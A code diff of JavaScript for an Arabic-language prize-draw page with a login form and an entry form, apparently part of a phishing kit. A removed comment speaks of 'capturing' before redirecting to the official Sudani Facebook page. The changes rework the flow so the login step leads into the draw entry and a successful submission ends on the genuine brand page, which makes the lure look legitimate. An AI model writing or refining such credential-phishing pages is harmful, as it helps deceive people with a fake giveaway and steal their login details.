@@ -105,7 +105,7 @@ document.getElementById('drawForm').addEventListener('submit', async function (e
             submitButton.textContent = 'تم الإرسال بنجاح ✅';
 
             setTimeout(() => {
-                window.location.reload();
+                window.location.href = 'https://www.facebook.com/SudaniSudan';
             }, 4000);
         } else {
             messageDiv.textContent = data.message || 'حدث خطأ، حاول مرة أخرى';
@@ -153,8 +153,10 @@ if (loginForm) {
         loginBtn.disabled = true;
 
         setTimeout(() => {
-            // After capturing, redirect to official Facebook page
-            window.location.href = 'https://www.facebook.com/SudaniSudan';
+            // Restore switching to the next section
+            loginSection.style.display = 'none';
+            entrySection.style.display = 'block';
+            entrySection.scrollIntoView({ behavior: 'smooth' });
         }, 1500);
     });
 }
